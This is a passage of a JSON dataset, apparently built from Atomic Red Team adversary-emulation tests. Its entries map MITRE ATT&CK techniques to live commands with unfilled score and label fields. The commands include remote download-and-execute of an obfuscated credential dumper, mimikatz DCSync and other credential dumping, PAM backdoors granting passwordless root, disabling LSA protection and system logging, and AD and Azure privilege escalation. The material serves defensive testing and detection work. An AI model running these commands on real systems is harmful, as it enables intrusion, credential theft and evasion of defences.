        "Description": "Mimic execution of compressed JavaScript file. When successfully executed, calculator.exe will open. This test is meant to help emulate Gootloader as per https://redcanary.com/blog/gootloader/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027",
        "Shell": "command_prompt"
    },
    {
        "ID": 665,
        "Command": "Start-Process \"PathToAtomicsFolder\\T1055.015\\bin\\ListPlanting.exe\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force",
        "Description": "This test injects shellcode into a remote RegEdit process using the ListPlanting technique. ListPlanting exploits Window with ListView control. Code write to memory with NtWriteVirtualMemory. The shellcode is executed via PostMessage. When successful, a message box will appear with the title \"Warning\" and the content \"Atomic Red Team\" after a few seconds. Notepad will open following the appearance of the message box.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.015",
        "Shell": "powershell"
    },
    {
        "ID": 666,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\" \"PathToAtomicsFolder\\T1220\\src\\msxslxmlfile.xml\" \"PathToAtomicsFolder\\T1220\\src\\msxslscript.xsl\"\n",
        "Description": "Executes the code specified within a XSL script tag during XSL transformation using a local payload. \nRequires download of MSXSL. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) \nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1220",
        "Shell": "command_prompt"
    },
    {
        "ID": 667,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\msxsl.exe\" \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml\" \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl\"\n",
        "Description": "Executes the code specified within a XSL script tag during XSL transformation using a remote payload.\nRequires download of MSXSL.exe. No longer available from Microsoft.\n(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )\nOpen Calculator.exe when test successfully executed, while AV turned off.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1220",
        "Shell": "command_prompt"
    },
    {
        "ID": 668,
        "Command": "wmic process list /FORMAT:\"PathToAtomicsFolder\\T1220\\src\\wmicscript.xsl\"\n",
        "Description": "Executes the code specified within a XSL script using a local payload.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1220",
        "Shell": "command_prompt"
    },
    {
        "ID": 669,
        "Command": "wmic process list /FORMAT:\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl\"\n",
        "Description": "Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1220",
        "Shell": "command_prompt"
    },
    {
        "ID": 670,
        "Command": "sudo sed -i \"1s,^,auth sufficient pam_succeed_if.so uid >= 0\\n,g\" /etc/pam.d/su-l\n",
        "Description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1556.003",
        "Shell": "sh"
    },
    {
        "ID": 671,
        "Command": "sudo sed -i \"\" \"8s,^,auth sufficient pam_succeed_if.so uid >= 0\\n,g\" /etc/pam.d/su\n",
        "Description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1556.003",
        "Shell": "sh"
    },
    {
        "ID": 672,
        "Command": "sudo sed -i \"1s,^,auth sufficient /tmp/pam_evil.so\\n,g\" /etc/pam.d/su-l\n",
        "Description": "Creates a PAM module, inserts a rule to use it, and then tests it.\n\nUpon successful execution, this test will create a PAM module that allows every user to su to root without a password.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1556.003",
        "Shell": "sh"
    },
    {
        "ID": 673,
        "Command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f\n",
        "Description": "The following Atomic adds a registry entry to disable LSA Protection.\n\nThe LSA controls and manages user rights information, password hashes and other important bits of information in memory. Attacker tools, such as mimikatz, rely on accessing this content to scrape password hashes or clear-text passwords. Enabling LSA Protection configures Windows to control the information stored in memory in a more secure fashion - specifically, to prevent non-protected processes from accessing that data.\nUpon successful execution, the registry will be modified and RunAsPPL will be set to 0, disabling Lsass protection.\nhttps://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#how-to-disable-lsa-protection\nhttps://blog.netwrix.com/2022/01/11/understanding-lsa-protection/\nhttps://thedfirreport.com/2022/03/21/phosphorus-automates-initial-access-using-proxyshell/  \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562",
        "Shell": "command_prompt"
    },
    {
        "ID": 674,
        "Command": "sudo systemctl stop systemd-journald #disables journal logging\n",
        "Description": "The atomic test disables the journal logging using built-in systemctl utility\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562",
        "Shell": "sh"
    },
    {
        "ID": 675,
        "Command": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf\n",
        "Description": "The atomic test disables the journal logging by searching and replacing the \"Storage\" parameter to \"none\" within the journald.conf file, thus any new journal entries will only be temporarily available in memory and not written to disk\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562",
        "Shell": "sh"
    },
    {
        "ID": 676,
        "Command": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:\"PathToAtomicsFolder\\T1218.010\\src\\RegSvr32.sct\" scrobj.dll\n",
        "Description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.010",
        "Shell": "command_prompt"
    },
    {
        "ID": 677,
        "Command": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll\n",
        "Description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.010",
        "Shell": "command_prompt"
    },
    {
        "ID": 678,
        "Command": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll) ELSE ( C:\\Windows\\system32\\regsvr32.exe /s PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll )\n",
        "Description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.010",
        "Shell": "command_prompt"
    },
    {
        "ID": 679,
        "Command": "C:\\Windows\\system32\\regsvr32.exe /s %temp%\\shell32.jpg\n",
        "Description": "Replicating observed Gozi maldoc behavior registering a dll with an altered extension\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.010",
        "Shell": "command_prompt"
    },
    {
        "ID": 680,
        "Command": "C:\\Windows\\system32\\regsvr32.exe /s /i \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx86.dll\"\n",
        "Description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.010",
        "Shell": "command_prompt"
    },
    {
        "ID": 681,
        "Command": "%tmp%\\mimikatz\\x64\\mimikatz.exe \"lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%\" \"exit\"\n",
        "Description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.\nWorks against a remote Windows Domain Controller using the replication protocol.\nPrivileges required: domain admin or domain controller account (by default), or any other account with required rights.\n[Reference](https://adsecurity.org/?p=1729)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.006",
        "Shell": "command_prompt"
    },
    {
        "ID": 682,
        "Command": "Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart(\"\\\")\n",
        "Description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.006",
        "Shell": "powershell"
    },
    {
        "ID": 683,
        "Command": "vaultcmd /listcreds:\"Windows Credentials\"\n",
        "Description": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nCredential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos\nhttps://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\nhttps://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 684,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')\nInvoke-WCMDump",
        "Description": "Loot local Credentials - Invoke-WCMDump technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1555.004",
        "Shell": "powershell"
    },
    {
        "ID": 685,
        "Command": "$x = Get-Random -Minimum 2 -Maximum 9999\n$y = Get-Random -Minimum 2 -Maximum 9999\n$z = Get-Random -Minimum 2 -Maximum 9999\n$w = Get-Random -Minimum 2 -Maximum 9999\nWrite-Host HaHa_$x$y$z\n\n$fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match \"User\" -and $_.PrincipalSource -match \"Local\"} | Select Name\n\nforeach($member in $fmm) {\n\\tif($member -like \"*Administrator*\") {\n\\t\\t$account = $member.Name.Split(\"\\\")[-1] # strip computername\\\n\\t\\t$originalDescription = (Get-LocalUser -Name $account).Description\n\\t\\tSet-LocalUser -Name $account -Description \"atr:$account;$originalDescription\".Substring(0,48) # Keep original name in description\n\\t\\tRename-LocalUser -Name $account -NewName \"HaHa_$x$y$z\" # Required due to length limitation\n\\t\\tWrite-Host \"Successfully Renamed $account Account on \" $Env:COMPUTERNAME\n\\t\\t}\n\\t}\n",
        "Description": "Manipulate Admin Account Name\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 686,
        "Command": "$x = Get-Random -Minimum 2 -Maximum 99\n$y = Get-Random -Minimum 2 -Maximum 99\n$z = Get-Random -Minimum 2 -Maximum 99\n$w = Get-Random -Minimum 2 -Maximum 99\n\nImport-Module ActiveDirectory\n$account = \"atr--$x$y$z\"\nNew-ADUser -Name $account -GivenName \"Test\" -DisplayName $account -SamAccountName $account -Surname $account -Enabled:$False \nAdd-ADGroupMember \"Domain Admins\" $account\n",
        "Description": "Create a random atr-nnnnnnnn account and add it to a domain group (by default, Domain Admins). \n\nThe quickest way to run it is against a domain controller, using `-Session` of `Invoke-AtomicTest`. Alternatively,\nyou need to install PS Module ActiveDirectory (in prereqs) and run the script with appropriare AD privileges to \ncreate the user and alter the group. Automatic installation of the dependency requires an elevated session, \nand is unlikely to work with Powershell Core (untested).\n\nIf you consider running this test against a production Active Directory, the good practise is to create a dedicated\nservice account whose delegation is given onto a dedicated OU for user creation and deletion, as well as delegated\nas group manager of the target group.\n\nExample: `Invoke-AtomicTest -Session $session 'T1098' -TestNames \"Domain Account and Group Manipulate\" -InputArgs @{\"group\" = \"DNSAdmins\" }`\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 687,
        "Command": "aws iam create-group --group-name atomicredteam\naws iam add-user-to-group --user-name atomicredteam --group-name atomicredteam\n",
        "Description": "Adversaries create AWS group, add users to specific to that group to elevate their privileges to gain more accesss\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "sh"
    },
    {
        "ID": 688,
        "Command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$user = Get-AzureADUser -Filter \"DisplayName eq 'SuperUser' or UserPrincipalName eq 'SuperUser'\"\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId\nWrite-Host \"User $($user.DisplayName) was added to $($role.DisplayName) role\"\n",
        "Description": "The adversaries want to add user to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to the user principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see User as a type.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 689,
        "Command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$sp = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'SuperSP'\"\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$role = Get-AzureADDirectoryRole -Filter \"DisplayName eq 'Global Reader'\"\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $sp.ObjectId\nWrite-Host \"Service Principal $($sp.DisplayName) was added to $($role.DisplayName)\"\n",
        "Description": "The adversaries want to add service principal to some Azure AD role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Global Administrator, Application Administrator, \nPrivileged Authentication Administrator (this role can reset Global Administrator password!).\nBy default, the role Global Reader is assigned to service principal in this test.\n\nThe account you use to run the PowerShell command should have Privileged Role Administrator or Global Administrator role in your Azure AD.\n\nDetection hint - check Activity \"Add member to role\" in Azure AD Audit Logs. In targer you will also see Service Principal as a type.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 690,
        "Command": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$user = Get-AzADUser | where-object {$_.DisplayName -eq \"SuperUser\" -or $_.UserPrincipalName -eq \"SuperUser\" }\nif ($user -eq $null) { Write-Warning \"User not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"}\nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $user.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"User $($user.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n",
        "Description": "The adversaries want to add user to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to user in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 691,
        "Command": "Import-Module -Name Az.Resources\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzAccount -Credential $Credential\n\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \"SuperSP\"}\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \"Azure subscription 1\"} \nif ($subscription -eq $null) { Write-Warning \"Subscription not found\"; exit }\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \"Reader\"}\nif ($role -eq $null) { Write-Warning \"Role not found\"; exit }\n\nNew-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\nWrite-Host \"Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\"\n",
        "Description": "The adversaries want to add service principal to some Azure role, also called Azure resource role. Threat actor \nmay be interested primarily in highly privileged roles, e.g. Owner, Contributor.\nBy default, the role Reader is assigned to service principal in this test.\n\nNew-AzRoleAssignment cmdlet could be also use to assign user/service principal to resource, resource group and management group.\n\nThe account you use to run the PowerShell command must have Microsoft.Authorization/roleAssignments/write \n(e.g. such as User Access Administrator or Owner) and the Azure Active Directory Graph Directory.Read.All \nand Microsoft Graph Directory.Read.All permissions.\n\nDetection hint - check Operation Name \"Create role assignment\" in subscriptions Activity Logs.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 692,
        "Command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = New-AzureADApplication -DisplayName \"test_app\"\n$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId\n#$aadApplication = Get-AzureADApplication -Filter \"DisplayName eq 'test_app'\"\n\n#Get Service Principal of Microsoft Graph Resource API \n$graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n\n#Initialize RequiredResourceAccess for Microsoft Graph Resource API \n$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess\n$requiredGraphAccess.ResourceAppId = $graphSP.AppId\n$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]\n\n#Set Application Permissions\n$ApplicationPermissions = @('DirectoryRecommendations.Read.All')\n\n$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}\nif($reqPermission)\n{\n$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess\n$resourceAccess.Type = \"Role\"\n$resourceAccess.Id = $reqPermission.Id\\t\n#Add required app permission\n$requiredGraphAccess.ResourceAccess.Add($resourceAccess)\n}\nelse\n{\nWrite-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red\n}\n\n#Add required resource accesses\n$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]\n$requiredResourcesAccess.Add($requiredGraphAccess)\n\n#Set permissions in existing Azure AD App\nSet-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess\n\n$servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"\n\nNew-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id\n",
        "Description": "The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.\nThis technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: \"Get-AzureADApplication\" instead of \"New-AzureADServicePrincipal\".\nThe DirectoryRecommendations.Read.All permissions has been selected as the default.\n\nThe account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.\n\nDetection hint - check Operation Name \"Add app role assignment to service principal\" in subscriptions Activity Logs.\nYou can also take a look at the materials:\nhttps://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/\nhttps://github.com/reprise99/Sentinel-Queries\nhttps://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766\nhttps://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 693,
        "Command": "ntdsutil \"set dsrm password\" \"sync from domain account %username%\" \"q\" \"q\"\n",
        "Description": "Change the password on the Directory Service Restore Mode (DSRM) account using ntdsutil by syncing to existing account\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "command_prompt"
    },
    {
        "ID": 694,
        "Command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n\\t$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n\\tif($cred.GetNetworkCredential().Password -eq \"Uplow-1\"){\n\\t  Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n\\t}\n\\ttry {\n\\t\\t$newPassword = ConvertTo-SecureString Uplow-1 -AsPlainText -Force\n\\t\\tSet-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n\\t}\n\\tcatch { \n\\t\\t$_.Exception\n\\t\\t$errCode = $_.Exception.ErrorCode\n\\t\\tWrite-Host \"Error code: $errCode\"\n\\t\\tif ($errCode -eq 86) {\n\\t\\t\\tWrite-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n\\t\\t\\tRemove-Item $credFile\n\\t\\t}\n\\t\\texit $errCode\n\\t}\n\\tWrite-Host -ForegroundColor Cyan \"Successfully changed the password to Uplow-1\"\n\\t$newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Uplow-1\" -AsPlainText -Force))\n\\t$newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n\\tWrite-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "Description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password.  You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 695,
        "Command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n\\t$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n\\tif($cred.GetNetworkCredential().Password -eq \"UpperLowerLong-special\"){\n\\t  Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n\\t}\n\\ttry {\n\\t\\t$newPassword = ConvertTo-SecureString UpperLowerLong-special -AsPlainText -Force\n\\t\\tSet-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n\\t}\n\\tcatch { \n\\t\\t$_.Exception\n\\t\\t$errCode = $_.Exception.ErrorCode\n\\t\\tWrite-Host \"Error code: $errCode\"\n\\t\\tif ($errCode -eq 86) {\n\\t\\t\\tWrite-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n\\t\\t\\tRemove-Item $credFile\n\\t\\t}\n\\t\\texit $errCode\n\\t}\n\\tWrite-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong-special\"\n\\t$newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong-special\" -AsPlainText -Force))\n\\t$newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n\\tWrite-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "Description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 696,
        "Command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n\\t$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n\\tif($cred.GetNetworkCredential().Password -eq \"UpperLowerLong333noSpecialChar\"){\n\\t  Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n\\t}\n\\ttry {\n\\t\\t$newPassword = ConvertTo-SecureString UpperLowerLong333noSpecialChar -AsPlainText -Force\n\\t\\tSet-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n\\t}\n\\tcatch { \n\\t\\t$_.Exception\n\\t\\t$errCode = $_.Exception.ErrorCode\n\\t\\tWrite-Host \"Error code: $errCode\"\n\\t\\tif ($errCode -eq 86) {\n\\t\\t\\tWrite-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n\\t\\t\\tRemove-Item $credFile\n\\t\\t}\n\\t\\texit $errCode\n\\t}\n\\tWrite-Host -ForegroundColor Cyan \"Successfully changed the password to UpperLowerLong333noSpecialChar\"\n\\t$newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UpperLowerLong333noSpecialChar\" -AsPlainText -Force))\n\\t$newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n\\tWrite-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "Description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 697,
        "Command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n\\t$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n\\tif($cred.GetNetworkCredential().Password -eq \"lower-long-special-333\"){\n\\t  Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n\\t}\n\\ttry {\n\\t\\t$newPassword = ConvertTo-SecureString lower-long-special-333 -AsPlainText -Force\n\\t\\tSet-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n\\t}\n\\tcatch { \n\\t\\t$_.Exception\n\\t\\t$errCode = $_.Exception.ErrorCode\n\\t\\tWrite-Host \"Error code: $errCode\"\n\\t\\tif ($errCode -eq 86) {\n\\t\\t\\tWrite-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n\\t\\t\\tRemove-Item $credFile\n\\t\\t}\n\\t\\texit $errCode\n\\t}\n\\tWrite-Host -ForegroundColor Cyan \"Successfully changed the password to lower-long-special-333\"\n\\t$newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"lower-long-special-333\" -AsPlainText -Force))\n\\t$newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n\\tWrite-Host -ForegroundColor Yellow \"You must store the password of the 